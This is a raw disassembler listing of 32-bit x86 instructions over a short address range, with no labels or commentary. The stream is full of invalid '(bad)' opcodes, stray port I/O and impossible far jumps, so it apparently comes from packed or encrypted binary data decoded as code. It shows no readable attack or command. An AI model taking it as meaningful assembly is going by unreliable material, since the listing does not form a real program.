  40dc06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc07:	sub    al,0x57
  40dc09:	imul   ebx,DWORD PTR [edx],0xfc325656
  40dc0f:	xchg   edx,eax
  40dc10:	lods   al,BYTE PTR ds:[esi]
  40dc11:	mov    bh,0xb
  40dc13:	xor    ebx,ebx
  40dc15:	inc    edi
  40dc16:	test   ah,dl
  40dc18:	push   ecx
  40dc19:	inc    edi
  40dc1a:	aad    0xd8
  40dc1c:	sbb    edx,ebp
  40dc1e:	push   0x3a
  40dc20:	test   DWORD PTR [eax+0x53],esi
  40dc23:	mov    ah,0x5c
  40dc25:	in     eax,dx
  40dc26:	pop    es
  40dc27:	fld    DWORD PTR [ecx-0x69064ab2]
  40dc2d:	mov    DWORD PTR [edx-0x37375bcb],ebx
  40dc33:	rcr    BYTE PTR [esi],cl
  40dc35:	or     DWORD PTR [esi],esi
  40dc37:	and    eax,0x17ea9d82
  40dc3c:	adc    DWORD PTR [ebx],edi
  40dc3e:	ds push edi
  40dc40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc41:	mov    ah,0xf1
  40dc43:	pop    edi
  40dc44:	xchg   esi,eax
  40dc45:	push   ebp
  40dc46:	jo     0x40dc73
  40dc48:	mov    ecx,0x98f341fe
  40dc4d:	loop   0x40dc0c
  40dc4f:	inc    ebp
  40dc50:	xchg   ebx,eax
  40dc51:	leave  
  40dc52:	data16 (bad) 
  40dc54:	arpl   WORD PTR [ebp-0x18b191de],bx
  40dc5a:	ret    
  40dc5b:	inc    esi
  40dc5c:	dec    ecx
  40dc5d:	and    esi,ebp
  40dc5f:	pop    eax
  40dc60:	mov    cl,0xf2
  40dc62:	loop   0x40dbf4
  40dc64:	mov    dl,0xe3
  40dc66:	aas    
  40dc67:	sahf   
  40dc68:	in     al,0xa1
  40dc6a:	xlat   BYTE PTR ds:[ebx]
  40dc6b:	mov    esp,0xeb441c4c
  40dc70:	xchg   ebp,eax
  40dc71:	fs loope 0x40dc6a
  40dc74:	sub    eax,0xe091f7a
  40dc79:	mov    ah,0xca
  40dc7b:	(bad)  
  40dc7c:	xor    al,BYTE PTR [edx+0x3f]
  40dc7f:	cs mov ebx,0x8651706
  40dc85:	xchg   ebp,eax
  40dc86:	xor    BYTE PTR [eax+0x58],bh
  40dc89:	xchg   edx,eax
  40dc8a:	push   ds
  40dc8b:	xor    BYTE PTR [ebp-0x1170a0ef],cl
  40dc91:	pop    ecx
  40dc92:	jl     0x40dd00
  40dc94:	aad    0xaf
  40dc96:	or     esp,DWORD PTR [eax-0x15]
  40dc99:	call   0xe2d4:0xb006826b
  40dca0:	and    al,0xd2
  40dca2:	cmp    ebx,DWORD PTR [eax-0x8]
  40dca5:	inc    esi
  40dca6:	cmc    
  40dca7:	repz mov dh,0x3
  40dcaa:	fucom  st(3)
  40dcac:	dec    edi
  40dcad:	mov    al,0x3d
  40dcaf:	es popf 
  40dcb1:	inc    ebp
  40dcb2:	jae    0x40dca7
  40dcb4:	test   BYTE PTR [ebx+0x75bc8bb7],dh
  40dcba:	mov    ah,0xa5
  40dcbc:	test   BYTE PTR [ebx+0x5e],dl
  40dcbf:	adc    BYTE PTR [eax+0x31],cl
  40dcc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcc3:	jnp    0x40dcf1
  40dcc5:	sbb    esi,DWORD PTR [edi]
  40dcc7:	in     al,0x8d
  40dcc9:	arpl   WORD PTR [esi-0x13c52562],cx
  40dccf:	mov    al,ds:0x74b04e4e
  40dcd4:	pop    ds
  40dcd5:	mov    edi,0x995ae531
  40dcda:	and    DWORD PTR [ebp-0x11],ecx
  40dcdd:	js     0x40dcad
  40dcdf:	mov    cs,WORD PTR [ebx+0x2c4c0d71]
  40dce5:	inc    eax
  40dce6:	cmp    bh,BYTE PTR [eax]
  40dce8:	sub    si,di
  40dceb:	push   ebp
  40dcec:	inc    edi
  40dced:	jecxz  0x40dd5e
  40dcef:	(bad)  
  40dcf0:	rol    dh,cl
  40dcf2:	(bad)  
  40dcf3:	scas   eax,DWORD PTR es:[edi]
  40dcf4:	retf   0xe9f5
  40dcf7:	or     bh,0xb6
  40dcfa:	cmp    al,BYTE PTR [eax+0x78]
  40dcfd:	into   
  40dcfe:	shl    DWORD PTR [edx+0x49bbd6ef],cl
  40dd04:	mov    bl,0x18
  40dd07:	inc    edi
  40dd08:	sahf   
  40dd09:	shr    DWORD PTR [ebp-0x3e221638],cl
  40dd0f:	mov    eax,0xf7fe4f41
  40dd14:	and    al,0x6e
  40dd16:	jnp    0x40dd2f
  40dd18:	pop    esi
  40dd19:	arpl   WORD PTR [ecx],dx
  40dd1b:	jae    0x40dd87
  40dd1d:	fwait
  40dd1e:	jge    0x40dd06
  40dd20:	int    0x11
  40dd22:	loop   0x40dd2d
  40dd24:	xor    eax,0xc724839f
  40dd29:	sti    
  40dd2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd2b:	lods   eax,DWORD PTR ss:[esi]
  40dd2d:	xchg   ecx,eax
  40dd2e:	jnp    0x40dcd3
  40dd30:	push   esi
  40dd31:	pop    ebx
  40dd32:	or     al,cl
  40dd34:	push   ebp
  40dd35:	pop    edi
  40dd36:	inc    esp
  40dd37:	rcl    BYTE PTR [ebx],0xa5
  40dd3a:	mov    dl,0xab
  40dd3c:	pop    ebx
  40dd3d:	fdiv   QWORD PTR ds:0x9390ccee
  40dd43:	mov    ebp,0x218dec70
  40dd48:	stc    
  40dd49:	mov    ebx,0x3cc18b61
  40dd4e:	mov    esp,0x338fa3b7
  40dd53:	jle    0x40dd1f
  40dd55:	fst    QWORD PTR [ecx+ebx*4-0x1c]
  40dd59:	ret    
  40dd5a:	lea    ebp,[edi+0x32]
  40dd5d:	cld    
  40dd5e:	xor    BYTE PTR [eax+esi*8-0x19],ah
  40dd62:	add    eax,0xdb01586a
  40dd67:	daa    
  40dd68:	rol    DWORD PTR [ecx+0x33],0xe3
  40dd6c:	mov    ebp,0x3f28f670
  40dd71:	push   ss
  40dd72:	add    DWORD PTR cs:[edx*2-0x51616a9],0xffffffeb
  40dd7b:	xor    BYTE PTR [esi-0x47d18770],0xb9
  40dd82:	mov    dh,bh
  40dd84:	sub    al,0x6d
  40dd86:	into   
  40dd87:	inc    esi
  40dd88:	enter  0xb226,0x7e
  40dd8c:	xchg   ebx,eax
  40dd8d:	arpl   sp,cx
  40dd8f:	imul   ebp,DWORD PTR [esi-0x4d4ba1e4],0xffffff8f
  40dd96:	mov    ds:0x1d3c1ed3,eax
  40dd9b:	es push eax
  40dd9d:	jbe    0x40dda7
  40dd9f:	sub    BYTE PTR [edi-0x3b581981],bh
  40dda5:	or     dh,ch
  40dda7:	int    0xbe
  40dda9:	cld    
  40ddaa:	sbb    al,0x45
  40ddac:	rcl    BYTE PTR [esi+0x5d],0x9e
  40ddb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddb1:	xchg   edi,esp
  40ddb3:	push   0x2789a0fd
  40ddb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddb9:	lods   eax,DWORD PTR ds:[esi]
  40ddba:	ins    BYTE PTR es:[edi],dx
  40ddbb:	cmp    ebp,DWORD PTR [ebx-0x15]
  40ddbe:	iret   
  40ddbf:	dec    esi
  40ddc0:	das    
  40ddc1:	stc    
  40ddc2:	shr    esp,1
  40ddc4:	lods   eax,DWORD PTR ds:[esi]
  40ddc5:	sub    ah,BYTE PTR [edx+edx*8-0x33]
  40ddc9:	sbb    DWORD PTR [edx-0x3e],edi
  40ddcc:	sub    DWORD PTR [eax+edx*4],ebp
  40ddcf:	adc    al,0xf9
  40ddd1:	pop    edx
  40ddd2:	sub    ebp,DWORD PTR [ebp+0x50b5576b]
  40ddd8:	stos   BYTE PTR es:[edi],al
  40ddd9:	add    edi,0x20379e57
  40dddf:	sbb    BYTE PTR [ebx+edi*2+0x11741f63],dh
  40dde6:	cmp    al,0xa
  40dde8:	sub    esp,ecx
  40ddea:	push   cs
  40ddeb:	pop    ss
  40ddec:	hlt    
  40dded:	xchg   esp,eax
  40ddee:	cwde   
  40ddef:	into   
  40ddf0:	jle    0x6f5c1999
  40ddf6:	mov    WORD PTR [ecx+0x4a],gs
  40ddf9:	sbb    BYTE PTR ds:0xf51c8a2,dl
  40ddff:	push   0xc88076d4
  40de04:	inc    ebp
  40de05:	push   es
  40de06:	push   es
  40de07:	shl    ah,1
  40de09:	jmp    0x40dde7
  40de0b:	push   0xffffff89
  40de0d:	push   es
  40de0e:	or     eax,0x17b98067
  40de13:	int3   
  40de14:	or     edx,DWORD PTR [ebx+edx*4]
  40de17:	scas   al,BYTE PTR es:[edi]
  40de18:	cwde   
  40de19:	xlat   BYTE PTR ds:[ebx]
  40de1a:	cld    
  40de1b:	pop    esp
  40de1c:	or     ecx,DWORD PTR [esi+eax*8]
  40de1f:	or     bh,0xe4
  40de22:	aas    
  40de23:	or     al,0x7b
  40de25:	jg     0x40de69
  40de27:	jae    0x40ddba
  40de29:	or     dh,BYTE PTR [ecx-0x26]
  40de2c:	aaa    
  40de2d:	adc    eax,0x46615592
  40de32:	mov    ch,BYTE PTR [ebx+0x37fda5bb]
  40de38:	sub    bl,BYTE PTR [edi-0x5381eb68]
  40de3e:	mov    ch,0x3f
  40de40:	sahf   
  40de41:	dec    eax
  40de42:	scas   al,BYTE PTR es:[edi]
  40de43:	test   al,0xfe
  40de45:	xor    al,0xe3
  40de47:	sbb    eax,0xed66d913
  40de4c:	sub    DWORD PTR [eax+0x1632ebe5],0xe9237cfb
  40de56:	cwde   
  40de57:	pop    edi
  40de58:	scas   al,BYTE PTR es:[edi]
  40de59:	cld    
  40de5a:	or     eax,0x68893d36
  40de5f:	jge    0x40de78
  40de61:	in     al,dx
  40de62:	retf   
  40de63:	cmp    BYTE PTR [esi+0x3e2a86cf],0x5a
  40de6a:	xchg   DWORD PTR [ebp-0x27],ebx
  40de6d:	(bad)  
  40de6e:	in     eax,dx
  40de6f:	mov    al,ds:0xad5411d6
  40de74:	inc    ecx
  40de75:	(bad)  
  40de76:	ds dec esi
  40de78:	pop    ebx
  40de79:	imul   esp,DWORD PTR [edx+eax*4-0x38],0x62
  40de7e:	jbe    0x40dea6
  40de80:	xor    dl,BYTE PTR [ebx+0xb353d20]
  40de86:	push   ebx
  40de87:	(bad)  
  40de88:	lods   al,BYTE PTR ds:[esi]
  40de89:	pop    esp
  40de8a:	lock pop esp
  40de8c:	adc    ah,BYTE PTR [esi+0x7a]
  40de8f:	ss pop es
  40de91:	xchg   edi,eax
  40de92:	stc    
  40de93:	adc    ch,BYTE PTR [ebx-0x20a4603b]
  40de99:	int3   
  40de9a:	cld    
  40de9b:	pop    ss
  40de9c:	mov    ch,0x53
  40de9e:	xor    DWORD PTR [ebx],eax
  40dea0:	cld    
  40dea1:	ins    BYTE PTR es:[edi],dx
  40dea2:	loopne 0x40df15
  40dea4:	mov    ecx,ebx
  40dea6:	xor    eax,0xcd5903d9
  40deab:	enter  0xf8f3,0xb9
  40deaf:	fwait
  40deb0:	in     al,dx
  40deb1:	out    dx,al
  40deb2:	push   eax
  40deb3:	test   BYTE PTR [esi+0x621b19a3],al
  40deb9:	shl    BYTE PTR [ecx],0x7a
  40debc:	and    bh,BYTE PTR [eax+0xed1bfc9]
  40dec2:	xchg   ecx,eax
  40dec3:	push   cs
  40dec4:	out    0xa1,al
  40dec6:	xor    eax,esi
  40dec8:	arpl   cx,cx
  40deca:	mov    dh,0x9d
  40decc:	push   esp
  40decd:	add    al,BYTE PTR [esi+0x7d803b2c]
  40ded3:	xchg   cx,ax
  40ded5:	sar    DWORD PTR [edi-0x5d99245],0xf8
  40dedc:	pop    esi
  40dedd:	sbb    bh,BYTE PTR [ebx-0xf]
  40dee0:	add    edx,eax
  40dee2:	call   0x1cb0f9fd
  40dee7:	repnz ins DWORD PTR es:[edi],dx
  40dee9:	and    ah,dh
  40deeb:	aam    0xcd
  40deed:	sub    edx,DWORD PTR ds:0xa3d236f8
  40def3:	sub    eax,0x5714e09
  40def8:	pushf  
  40def9:	fs lock cdq 
  40defc:	mov    ecx,0x563aaeff
  40df01:	sbb    DWORD PTR [esi-0x715f1278],ebx
  40df07:	cdq    
  40df08:	pop    ebx
  40df09:	cmp    eax,0xdaa807a1
  40df0e:	call   0x7e9c3e79
  40df13:	sub    eax,0xb28024f1
  40df18:	and    eax,0xb4f862d6
  40df1d:	lods   al,BYTE PTR ds:[esi]
  40df1e:	xor    al,0x78
  40df20:	pop    ds
  40df21:	sub    eax,0x81877fae
  40df26:	and    bl,ch
  40df28:	mov    bl,0x4a
  40df2a:	mov    ah,0x2f
  40df2c:	xor    BYTE PTR [edx],0xaf
  40df2f:	mov    bl,0x71
  40df31:	neg    esp
  40df33:	icebp  
  40df34:	sub    DWORD PTR [ecx-0xc7a96c8],edx
  40df3a:	mov    esp,0xe16b2c0d
  40df3f:	add    eax,0x1b9951d9
  40df44:	stc    
  40df45:	inc    edx
  40df46:	bound  edx,QWORD PTR [ebp-0x57]
  40df49:	sub    BYTE PTR [edx-0x10],0xfb
  40df4d:	or     eax,0xb37ef21c
  40df52:	or     esi,0xd
  40df55:	and    BYTE PTR ds:[eax+0x47087a80],ah
  40df5c:	in     al,0xa1
  40df5e:	xor    al,0x4f
  40df60:	cli    
  40df61:	xor    esi,DWORD PTR [ebp+0x7b17464e]
  40df67:	mov    ecx,esp
  40df69:	inc    edi
  40df6a:	jge    0x40df82
  40df6c:	xor    BYTE PTR [edx+0x19],al
  40df6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df70:	xchg   esp,eax
  40df71:	std    
  40df72:	retf   0x7316
  40df75:	xchg   esp,eax
  40df76:	jnp    0x40df08
  40df78:	leave  
  40df79:	xchg   ebx,eax
  40df7a:	push   ss
  40df7b:	test   al,0xd
  40df7d:	pushf  
  40df7e:	adc    al,0xfc
  40df80:	cmp    al,0xd1
  40df82:	out    dx,eax
  40df83:	stos   DWORD PTR es:[edi],eax
  40df84:	sub    esp,esi
  40df86:	sbb    eax,0x2a00fb77
  40df8b:	mov    ecx,edx
  40df8d:	loope  0x40df3f
  40df8f:	(bad)  
  40df90:	pop    ds
  40df91:	aam    0x2
  40df93:	inc    esi
  40df94:	cmp    BYTE PTR [ecx+0x44],dh
  40df97:	dec    edi
  40df98:	mov    ebx,0xd37240b0
  40df9d:	cwde   
  40df9e:	xchg   edx,eax
  40df9f:	inc    ebx
  40dfa0:	jo     0x40df79
  40dfa2:	mov    ebx,DWORD PTR [ebx]
  40dfa4:	popa   
  40dfa5:	xchg   edx,eax
  40dfa6:	in     eax,0xff
  40dfa8:	fisttp DWORD PTR [edi+0x36c3fccb]
  40dfae:	mov    ecx,0x8d46542
  40dfb3:	outs   dx,DWORD PTR ds:[esi]
  40dfb4:	mov    cl,BYTE PTR [ebx-0x66]
  40dfb7:	add    al,0x3c
  40dfb9:	mov    bh,0xec
  40dfbb:	push   esi
  40dfbc:	xchg   DWORD PTR [edx-0x2a],edi
  40dfbf:	fcomip st,st(5)
  40dfc1:	fwait
  40dfc2:	pop    es
  40dfc3:	mov    eax,0xcadbf024
  40dfc8:	fcomi  st,st(7)
  40dfca:	ds call 0x651d0a41
  40dfd0:	mov    edx,0xbf1eb1f4
  40dfd5:	popf   
  40dfd6:	jge    0x40dfc6
  40dfd8:	xchg   edi,eax
  40dfd9:	mov    dh,0x52
  40dfdb:	fcmovnb st,st(6)
  40dfdd:	test   al,0x9
  40dfdf:	dec    esp
  40dfe0:	cmc    
  40dfe1:	add    al,al
  40dfe3:	pop    esi
  40dfe4:	inc    eax
  40dfe5:	aam    0x49
  40dfe7:	mov    ds:0xfbd969e0,eax
  40dfec:	test   BYTE PTR [ecx-0x80],bh
  40dfef:	mov    eax,0x2dea784b
  40dff4:	paddusb mm0,QWORD PTR [esi]
  40dff7:	into   
  40dff8:	pop    es
  40dff9:	dec    eax
  40dffa:	or     edi,DWORD PTR [eax+0x61]
  40dffd:	in     eax,dx
  40dffe:	leave  
  40dfff:	fs loopne 0x40dfa3
  40e002:	(bad)  
  40e003:	push   eax
  40e004:	popf   
  40e005:	add    BYTE PTR [esi],ah
  40e007:	adc    esp,DWORD PTR [ebp+edi*4-0x5e4c4293]
  40e00e:	lods   eax,DWORD PTR ds:[esi]
  40e00f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e010:	mov    esi,DWORD PTR [eax]
  40e012:	jb     0x40dfaf
  40e014:	ret    
  40e015:	lds    ebx,FWORD PTR [esi+0x42]
  40e018:	jno    0x40dfcd
  40e01a:	retf   
  40e01b:	sub    dl,bl
  40e01d:	adc    dl,cl
  40e01f:	loope  0x40dfbe
  40e021:	fldcw  WORD PTR [esi+0x63dba6e6]
  40e027:	test   BYTE PTR [eax-0x1b],bh
  40e02a:	pop    ebp
  40e02b:	iret   
  40e02c:	test   eax,0xf271c0aa
  40e031:	mov    ebp,0x6b6041a2
  40e036:	sub    eax,0xfceb1d9a
  40e03b:	mov    cl,0xa7
  40e03d:	test   eax,0x78cdcfb3
  40e042:	in     eax,0x67
  40e044:	and    dh,BYTE PTR [ebp+0x29419a5]
  40e04a:	sub    ah,BYTE PTR [ecx+0x75d994f7]
  40e050:	and    al,0x48
  40e052:	daa    
  40e053:	(bad)  
  40e055:	inc    esp
  40e056:	inc    ebp
  40e057:	mov    ds:0x8f107227,al
  40e05c:	push   ebp
  40e05d:	rcl    DWORD PTR [ebp+0x6615ca37],cl
  40e063:	cmp    bl,al
  40e065:	jb     0x40e044
  40e067:	mov    eax,ds:0xa18606d5
  40e06c:	sbb    dh,BYTE PTR [ebp+0x48644337]
  40e072:	addr16 sbb ebp,esi
  40e075:	clc    
  40e076:	imul   edi,DWORD PTR [edx+eiz*2],0xffffffc1
  40e07a:	pop    edi
  40e07b:	mov    ds:0x70b2bed5,al
  40e080:	enter  0xd918,0x6c
  40e084:	and    DWORD PTR [ebp-0x2053995e],0xffffffa0
  40e08b:	cmp    dh,bl
  40e08d:	jecxz  0x40e0b0
  40e08f:	mov    WORD PTR [edi],es
  40e091:	aam    0x9
  40e093:	fucomip st,st(3)
  40e095:	adc    eax,0x9629acf3
  40e09a:	mov    ds:0xf6795b12,al
  40e09f:	pop    ecx
  40e0a0:	mov    BYTE PTR [ebp-0x40],bh
  40e0a3:	or     eax,0xcc28402b
  40e0a8:	fcomp  st(1)
  40e0aa:	ss pop ds
  40e0ac:	in     al,0xdc
  40e0ae:	cld    
  40e0af:	mov    ah,0x26
  40e0b1:	mov    bl,0xd1
  40e0b3:	in     al,dx
  40e0b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0b5:	xchg   ebx,eax
  40e0b6:	je     0x40e060
  40e0b8:	xor    bl,BYTE PTR [esi+ebp*4]
  40e0bb:	in     eax,dx
  40e0bc:	(bad)
  40e0bf:	and    esi,DWORD PTR [edx-0x6a]
  40e0c2:	sti    
  40e0c3:	mov    edi,cs
  40e0c5:	or     DWORD PTR [ecx-0x3569d600],0xfffffff5
  40e0cc:	jbe    0x40e0c0
  40e0ce:	pop    esi
  40e0cf:	in     eax,0x1e
  40e0d1:	mov    cl,0x2c
  40e0d3:	inc    DWORD PTR [eax]
  40e0d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0d6:	lock mov eax,ss
  40e0d9:	fs dec esp
  40e0db:	xlat   BYTE PTR ds:[ebx]
  40e0dc:	in     eax,dx
  40e0dd:	outs   dx,BYTE PTR ds:[esi]
  40e0de:	mov    esi,DWORD PTR [ebx-0x7a0c2200]
  40e0e4:	icebp  
  40e0e5:	pop    ecx
  40e0e6:	mov    edx,0x9450570d
  40e0eb:	sub    eax,0x6bd7b765
  40e0f0:	addr16 and eax,esi
  40e0f3:	push   ebp
  40e0f4:	in     al,dx
  40e0f5:	cmc    
  40e0f6:	popa   
  40e0f7:	dec    edx
  40e0f8:	ret    0xd5fe
  40e0fb:	push   edi
  40e0fc:	xor    eax,0xb87680fc
  40e101:	xor    al,0x5e
  40e103:	shr    DWORD PTR [edx+0x11],cl
  40e106:	stos   DWORD PTR es:[edi],eax
  40e107:	jae    0x40e15a
  40e109:	and    bh,BYTE PTR [edi-0x17]
  40e10c:	int3   
  40e10d:	jns    0x40e0e5
  40e10f:	dec    edx
  40e110:	adc    ah,BYTE PTR [eax-0x4a693964]
  40e116:	rcl    ebx,cl
  40e118:	rol    BYTE PTR ds:0x4e46d610,0xe1
  40e11f:	aam    0x9d
  40e121:	mov    esp,0xd8854789
  40e126:	popa   
  40e127:	push   0xc952f27
  40e12c:	data16 (bad) 
  40e12e:	mov    bl,0x86
  40e130:	fcomp  DWORD PTR [edi+0x29]
  40e133:	cmp    DWORD PTR [eax-0x52],esp
  40e136:	jle    0x40e0f6
  40e138:	cmp    dl,0x77
  40e13b:	xor    dl,BYTE PTR [eax-0x52]
  40e13e:	sbb    al,BYTE PTR [ebp+0x1ffabef3]
  40e144:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e145:	jne    0x40e199
  40e147:	dec    esi
  40e148:	les    ebp,FWORD PTR [edx]
  40e14a:	mov    BYTE PTR [ebx-0x31],cl
  40e14d:	pop    esi
  40e14e:	mov    al,ds:0xceedf161
  40e153:	mov    ecx,0x354252f6
  40e158:	mov    dl,0x36
  40e15a:	and    edx,0x6d
  40e15d:	xor    eax,0xb0809afe
  40e162:	sar    BYTE PTR [ecx+0x36],0xd5
  40e166:	sbb    BYTE PTR [ecx],bh
  40e168:	repnz xor eax,DWORD PTR [edx-0x40]
  40e16c:	xlat   BYTE PTR ds:[ebx]
  40e16d:	pop    ecx
  40e16e:	and    al,0x24
  40e170:	dec    edi
  40e171:	cld    
  40e172:	aam    0xaa
  40e174:	or     BYTE PTR [ecx-0x2],ch
  40e177:	aaa    
  40e178:	lea    eax,[eax+0x3ea4c2b]
  40e17e:	adc    esp,DWORD PTR [eax]
  40e180:	xchg   edi,eax
  40e181:	retf   
  40e182:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e183:	(bad)  
  40e184:	daa    
  40e185:	push   ebp
  40e186:	add    BYTE PTR [ebp+0x3d],ch
  40e189:	xchg   ebp,eax
  40e18a:	inc    eax
  40e18b:	xchg   esi,eax
  40e18c:	sbb    edi,DWORD PTR [ebx*2-0x6644de15]
  40e193:	jmp    0xfb949d36
  40e198:	mov    BYTE PTR [ecx],0xee
  40e19b:	mov    bl,0x14
  40e19d:	es adc al,0xce
  40e1a0:	mov    gs,WORD PTR [eax-0x67bd7543]
  40e1a6:	push   edx
  40e1a7:	mov    ah,0x76
  40e1a9:	jno    0x40e1a4
  40e1ab:	mov    ds:0x5f9ea261,eax
  40e1b0:	ins    BYTE PTR es:[edi],dx
  40e1b1:	push   esp
  40e1b2:	ins    DWORD PTR es:[edi],dx
  40e1b3:	pop    ds
  40e1b4:	lahf   
  40e1b5:	xor    al,0x34
  40e1b7:	dec    esi
  40e1b8:	jno    0x40e215
  40e1ba:	pushf  
  40e1bb:	call   0xde63:0x2e10caab
  40e1c2:	pop    esi
  40e1c3:	call   0xc380:0x5da4d13c
  40e1ca:	inc    esp
  40e1cb:	pop    es
  40e1cc:	loope  0x40e166
  40e1ce:	mov    eax,ds:0x99ef411e
  40e1d3:	scas   eax,DWORD PTR es:[edi]
  40e1d4:	test   al,0x8d
  40e1d6:	jmp    0x40e222
  40e1d8:	or     ch,BYTE PTR [edi+0x3951fd13]
  40e1de:	repz rcr BYTE PTR [edi-0x24],cl
  40e1e2:	jp     0x40e1c9
  40e1e4:	mov    ds:0x72d15881,eax
  40e1e9:	sar    BYTE PTR [esi],1
  40e1eb:	cli    
  40e1ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1ed:	imul   ebp,DWORD PTR [eax+edi*4],0x51
  40e1f1:	jecxz  0x40e199
  40e1f3:	sahf   
  40e1f4:	mov    cl,0xee
  40e1f6:	push   0xffffff9d
  40e1f8:	shl    BYTE PTR [edi],0xf4
  40e1fb:	mov    cl,0xa7
  40e1fd:	mov    ah,0x1c
  40e1ff:	add    eax,0xe103be37
  40e204:	jmp    0x5ef1:0xd2ddfd54
  40e20b:	int3   
  40e20c:	fst    QWORD PTR [edx+0x6e]
  40e20f:	push   ebx
  40e210:	cmc    
  40e211:	daa    
  40e212:	loopne 0x40e1d6
  40e214:	sbb    eax,0x62d3fbda
  40e219:	lock fisttp DWORD PTR [edi+0x27]
  40e21d:	out    dx,eax
  40e21e:	inc    esi
  40e220:	dec    edx
  40e221:	dec    esp
  40e222:	inc    eax
  40e223:	jae    0x40e24a
  40e225:	mov    esp,DWORD PTR [ecx-0x57bde4cc]
  40e22b:	mov    eax,0xa9215837
  40e230:	adc    al,dl
  40e232:	push   esi
  40e233:	jmp    0x40e249
  40e235:	jae    0x40e240
  40e237:	jge    0x40e2a2
  40e239:	sub    eax,DWORD PTR [eax+0x44]
  40e23c:	dec    edx
  40e23d:	scas   eax,DWORD PTR es:[edi]
  40e23e:	je     0x40e274
  40e240:	shr    eax,cl
  40e242:	jne    0x40e1e1
  40e244:	xchg   edi,eax
  40e245:	int    0x60
  40e247:	out    dx,eax
  40e248:	test   DWORD PTR [edx-0x4390f951],0x8edd35b7
  40e252:	push   ds
  40e253:	sbb    al,0x6b
  40e255:	rcr    BYTE PTR [eax+0x3d],cl
  40e258:	sub    edx,DWORD PTR [ebx+0x78]
  40e25b:	outs   dx,BYTE PTR ds:[esi]
  40e25c:	push   0x7d
  40e25e:	inc    ebx
  40e25f:	xchg   esp,eax
  40e260:	push   eax
  40e261:	xchg   edx,eax
  40e262:	mov    BYTE PTR fs:[ebx],cl
  40e265:	dec    edi
  40e266:	add    al,BYTE PTR [esi-0x42]
  40e269:	jp     0x40e28d
  40e26b:	jno    0x40e2d0
  40e26d:	cmp    bl,dh
  40e26f:	xor    BYTE PTR [edx+0x8f257d8],ah
  40e275:	pop    edi
  40e276:	inc    esp
  40e277:	dec    edx
  40e278:	mov    ecx,fs
  40e27a:	cli    
  40e27b:	shl    BYTE PTR [ebp+0x79],0x54
  40e27f:	int3   
  40e280:	and    DWORD PTR [edi-0x29],eax
  40e283:	adc    eax,0x15b6a83c
  40e288:	aas    
  40e289:	sub    bh,dh
  40e28b:	sub    al,0xe2
  40e28d:	xchg   edx,eax
  40e28e:	enter  0x9077,0xca
  40e292:	push   0x9f1c4d78
  40e297:	xor    DWORD PTR [eax],esp
  40e299:	fs clc 
  40e29b:	xchg   esi,eax
  40e29c:	ret    0xdddc
  40e29f:	adc    dh,dh
  40e2a1:	xacquire xchg DWORD PTR [ebx+0x1e5e4272],eax
  40e2a8:	jge    0x40e2e9
  40e2aa:	dec    BYTE PTR [eax]
  40e2ac:	xor    DWORD PTR [eax+edi*1],ebp
  40e2af:	and    ch,ch
  40e2b1:	dec    dl
  40e2b3:	adc    bl,BYTE PTR [ecx+ebx*2]
  40e2b6:	push   0x1e2f3f5
  40e2bb:	xchg   edi,eax
  40e2bc:	xor    BYTE PTR [ebx-0xf],cl
  40e2bf:	int    0x4d
  40e2c1:	mov    ebx,0x64c9e93
  40e2c6:	shr    ebp,cl
  40e2c8:	leave  
  40e2c9:	stos   DWORD PTR es:[edi],eax
  40e2ca:	fist   WORD PTR [ebx]
  40e2cc:	mov    DWORD PTR [edi-0x11],ebx
  40e2cf:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2d1:	jne    0x40e2a1
  40e2d3:	inc    ecx
  40e2d4:	loope  0x40e2db
  40e2d6:	test   BYTE PTR [edi-0x267fb3d1],0xcd
  40e2dd:	and    bh,bl
  40e2df:	xchg   edi,eax
  40e2e0:	loopne 0x40e2c7
  40e2e2:	or     bl,BYTE PTR [bp+si-0x67]
  40e2e6:	jecxz  0x40e32f
  40e2e8:	cli    
  40e2e9:	push   ebp
  40e2ea:	mov    bl,dl
  40e2ec:	loope  0x40e36b
  40e2ee:	pop    DWORD PTR [ecx+0x48]
  40e2f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2f2:	pop    es
  40e2f3:	dec    ebx
  40e2f4:	fcom   DWORD PTR [ebx-0x51497dcb]
  40e2fa:	and    ch,BYTE PTR [eax+ebx*2+0x6a]
  40e2fe:	and    al,0xe2
  40e300:	adc    eax,0x33200c3
  40e305:	xor    al,0xc1
  40e307:	mov    ebp,0x8a163358
  40e30c:	fucomip st,st(1)
  40e30e:	jmp    0x41e5caca
  40e313:	sub    DWORD PTR [ecx],0xffffffca
  40e316:	push   edi
  40e317:	jg     0x40e2e0
  40e319:	jle    0x40e2a5
  40e31b:	test   DWORD PTR [esi],eax
  40e31d:	pop    es
  40e31e:	push   ds
  40e31f:	cmp    ah,dl
  40e321:	(bad)  
  40e322:	call   FWORD PTR [edx]
  40e324:	bound  esi,QWORD PTR [eax]
  40e326:	cdq    
  40e327:	xor    eax,0x8081879e
  40e32c:	sub    BYTE PTR [eax],dl
  40e32e:	call   0x48bbab22
  40e333:	test   DWORD PTR [ecx-0x11],0xbb591669
  40e33a:	pop    edi
  40e33b:	sti    
  40e33c:	xlat   BYTE PTR ds:[ebx]
  40e33d:	adc    DWORD PTR [ebp+0xaea0d96],ebx
  40e343:	lock aam 0x19
  40e346:	fs xchg esi,eax
  40e348:	xor    BYTE PTR [esi+0x77],cl
  40e34b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e34c:	dec    ebp
  40e34d:	dec    esp
  40e34e:	imul   ecx,ecx,0xffffffdd
  40e351:	dec    esp
  40e352:	push   ecx
  40e353:	idiv   BYTE PTR [ecx+ebp*8]
  40e356:	pusha  
